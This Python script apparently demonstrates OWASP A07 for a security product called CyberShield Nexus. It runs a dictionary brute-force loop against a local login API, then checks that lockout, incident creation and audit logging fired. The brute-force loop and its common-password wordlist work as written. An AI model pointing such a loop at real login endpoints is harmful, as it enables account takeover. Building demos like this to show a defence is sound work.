#!/usr/bin/env python3
"""
=============================================================================
ATTACK SCRIPT 1 — Brute Force Login Attack
CyberShield Nexus | NEDI Demo Scenario
OWASP Top 10: A07:2021 — Identification and Authentication Failures
=============================================================================

WHAT THIS DEMONSTRATES:
  Phase 1 (Vulnerable):  No rate limiting — attacker can try unlimited passwords
  Phase 2 (Protected):   Account locks after 5 failures — attack is blocked

HOW TO RUN:
  python brute_force.py

EXPECTED RESULTS:
  - First 5 attempts: 401 Unauthorized (wrong password)
  - Attempt 6+: 403 Forbidden (account locked for 15 minutes)
  - CyberShield auto-creates a HIGH severity Incident
  - AuditLog records every LOGIN_FAIL event
=============================================================================
"""

import requests
import time
import json
import sys
from datetime import datetime

# Ensure Windows PowerShell console handles UTF-8 emojis without crashing
if hasattr(sys.stdout, 'reconfigure'):
    sys.stdout.reconfigure(encoding='utf-8')

BASE_URL = "http://localhost:8081/api"
TARGET_USER = "serveradmin"  # Account to brute-force
ADMIN_PASS = "Admin@123"     # Admin password to verify dashboard after

# Common password wordlist (simulated dictionary attack)
WORDLIST = [
    "password", "123456", "admin", "letmein", "qwerty",
    "password123", "admin123", "iloveyou", "monkey", "dragon",
    "master", "sunshine", "princess", "welcome", "shadow",
    "superman", "michael", "football", "baseball", "abc123",
    "1234567", "trustno1", "Admin@123"   # <-- correct one (last for demo)
]

SEPARATOR = "=" * 65


def banner():
    print(SEPARATOR)
    print("  CYBERSHIELD NEXUS — BRUTE FORCE ATTACK DEMO")
    print("  OWASP A07: Authentication Failures")
    print(f"  Target: {TARGET_USER} @ {BASE_URL}")
    print(f"  Time:   {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(SEPARATOR)


def try_login(username, password):
    try:
        res = requests.post(
            f"{BASE_URL}/auth/login",
            json={"username": username, "password": password},
            timeout=5
        )
        return res.status_code, res.json() if res.content else {}
    except requests.exceptions.ConnectionError:
        print("  ❌ Cannot connect to server! Is the app running on port 8081?")
        exit(1)
    except Exception as e:
        return 0, {"error": str(e)}


def get_incidents(token):
    try:
        res = requests.get(
            f"{BASE_URL}/incidents",
            headers={"Authorization": f"Bearer {token}"},
            timeout=5
        )
        return res.json() if res.ok else []
    except:
        return []


def get_audit_log(token):
    try:
        res = requests.get(
            f"{BASE_URL}/audit-logs",
            headers={"Authorization": f"Bearer {token}"},
            timeout=5
        )
        return res.json() if res.ok else []
    except:
        return []


def main():
    banner()

    print("\n📋 PHASE 1 — Running Brute Force Attack...\n")
    results = []

    for i, password in enumerate(WORDLIST, 1):
        status, body = try_login(TARGET_USER, password)

        icon = "✅" if status == 200 else ("🔒" if status == 403 else "❌")
        label = "SUCCESS" if status == 200 else ("LOCKED" if status == 403 else "FAIL")

        print(f"  [{i:02d}] Trying '{password:<20}' → {icon} {label} (HTTP {status})")

        results.append({
            "attempt": i,
            "password": password,
            "status": status,
            "label": label
        })

        if status == 200:
            print(f"\n  ⚠️  PASSWORD FOUND: '{password}'")
            print(f"  Token: {body.get('token', '')[:40]}...")
            break

        if status == 403:
            msg = body.get("message", body.get("error", "Account locked"))
            print(f"\n  🔒 ACCOUNT LOCKED: {msg}")
            print("  ✅ CyberShield protection activated!")
            break

        time.sleep(0.2)  # Realistic delay

    # Summary
    failed = sum(1 for r in results if r["status"] == 401)
    locked = sum(1 for r in results if r["status"] == 403)

    print(f"\n{SEPARATOR}")
    print("  ATTACK SUMMARY")
    print(SEPARATOR)
    print(f"  Total attempts  : {len(results)}")
    print(f"  Failed (401)    : {failed}")
    print(f"  Locked (403)    : {locked}")

    # Now login as admin and check dashboard
    print(f"\n📋 PHASE 2 — Checking CyberShield Response...\n")
    admin_status, admin_body = try_login("admin", ADMIN_PASS)

    if admin_status == 200:
        token = admin_body.get("token")
        print("  ✅ Admin login successful")

        # Check incidents
        incidents = get_incidents(token)
        open_incidents = [i for i in incidents if i.get("status") == "OPEN"]
        print(f"\n  🚨 Incidents created: {len(incidents)}")
        for inc in open_incidents[:3]:
            print(f"     [{inc['severity']}] {inc['title']}")

        # Check audit log for LOGIN_FAIL
        logs = get_audit_log(token)
        fail_logs = [l for l in logs if l.get("action") == "LOGIN_FAIL"
                     and l.get("attemptedUsername") == TARGET_USER]
        print(f"\n  📜 LOGIN_FAIL audit entries for '{TARGET_USER}': {len(fail_logs)}")
        for log in fail_logs[:5]:
            print(f"     {log.get('timestamp', '')[:19]} — {log.get('detail', '')}")

    print(f"\n{SEPARATOR}")
    print("  OWASP A07 DEMONSTRATED:")
    print("  Without fix → attacker can try unlimited passwords")
    print("  With fix    → account locked after 5 failures, incident raised")
    print(SEPARATOR)


if __name__ == "__main__":
    main()
